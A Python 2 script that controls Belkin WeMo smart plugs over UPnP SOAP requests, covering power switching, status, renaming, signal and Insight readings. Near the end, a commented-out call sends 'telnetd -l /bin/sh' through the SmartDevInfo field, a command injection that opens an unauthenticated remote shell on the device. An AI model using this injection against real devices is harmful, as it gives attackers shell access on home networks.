import json
import re
import  urllib2
import os
from time import sleep




def On(ip):
	switch = wemo(ip)
	return output(switch.on())

def Off(ip):
	switch = wemo(ip)
	return output(switch.off())

def Toggle(ip):
	switch = wemo(ip)
	return output(switch.toggle())

def Status(ip):
	switch = wemo(ip)
	return output(switch.status())

def Name(ip):
	switch = wemo(ip)
	return output(switch.name())

def Rename(ip, name):
	switch = wemo(ip)
	return output(switch.rename(name))

def Signal(ip):
	switch = wemo(ip)
	return output(switch.signal())

def Insight(ip):
	switch = wemo(ip)
	return output(switch.insight())

def Power(ip):
	switch = wemo(ip)
	return output(switch.power())
def SmartDev(ip,data):
        switch = wemo(ip)
        return output(switch.smartdev(data))


	




# ip = '192.168.129.35'

ports = [49155, 49153, 49154, 49152, 49151]
##ports = [49153, 49152, 49154, 49151, 49155]

class wemo:
	
	OFF_STATE = '0'
	ON_STATES = ['1', '8']
	ip = None
	
##	ports = [49153, 49152, 49154, 49151, 49155]

	def __init__(self, switch_ip):
		self.ip = switch_ip      
   
	def toggle(self):
		status = self.status()
		if status in self.ON_STATES:
			result = self.off()
			result = '0'
		elif status == self.OFF_STATE:
			result = self.on()
			result = '1'
		else:
			raise Exception("UnexpectedStatusResponse")
		return result    

	def on(self):
		return self._send('Set','basicevent','BinaryState', 1)

	def off(self):
		return self._send('Set','basicevent', 'BinaryState', 0)

	def status(self):
		return self._send('Get','basicevent','BinaryState')

	def name(self):
		return self._send('Get', 'basicevent','FriendlyName')
	    
	

	def signal(self):
		return self._send('Get', 'basicevent','SignalStrength')

	def insight(self):
		return self._send('Get', 'insight','InsightParams')	

	def smartdev(self,data):
		return self._send('Set', 'basicevent','SmartDevInfo',data)	

	def rename(self,name):
		return self._send('Change', 'basicevent','FriendlyName',name)	
		
##        def smartdev(self,name):
##		return self._send('Set', 'basicevent','FriendlyName',name)	
##		

  
	def _get_header_xml(self, method, service, obj):
		method = method + obj
		return '"urn:Belkin:service:%s:1#%s"' % (service,method)
   
	def _get_body_xml(self, method, service, obj, value=0):
		method = method + obj
		return '<u:%s xmlns:u="urn:Belkin:service:%s:1"><%s>%s</%s></u:%s>' % (method, service, obj, value, obj, method)
	
	def _send(self, method, service, obj, value=None):
		body_xml = self._get_body_xml(method,service, obj, value)
		header_xml = self._get_header_xml(method,service, obj)
		properport = 0
		for i in range(len(ports)):
			result = self._try_send(self.ip, ports[i], body_xml, header_xml, service, obj)
			print(str(self.ip)+': '+ str(result))
			if result != None and str(result) !='None':
				self.ports = ports[i]
				return result
		
		return result
		raise Exception("TimeoutOnAllPorts")

	def _try_send(self, ip, port, body, header, service, data):
		try:
			request =  urllib2.Request('http://%s:%s/upnp/control/%s1' % (ip, port, service))
			request.add_header('Content-type', 'text/xml; charset="utf-8"')
			request.add_header('SOAPACTION', header)
			request_body = '<?xml version="1.0" encoding="utf-8"?>'
			request_body += '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
			request_body += '<s:Body>%s</s:Body></s:Envelope>' % body
			request.data = request_body.encode()
			result =  urllib2.urlopen(request, timeout=0.2)
			print("")
			print(str(request.data))
			print("")

			return self._extract(result.read().decode(), data)
		except Exception as e:
			print(str(e))
			return None

	def _extract(self, response, name):
		exp = '<%s>(.*?)<\/%s>' % (name, name)
		g = re.search(exp, response)
		if g:
			return g.group(1)
		return response

def output(message):
	return message
    
    
##    
##result = SmartDev('192.168.129.25','telnetd -l /bin/sh')
##print(result)




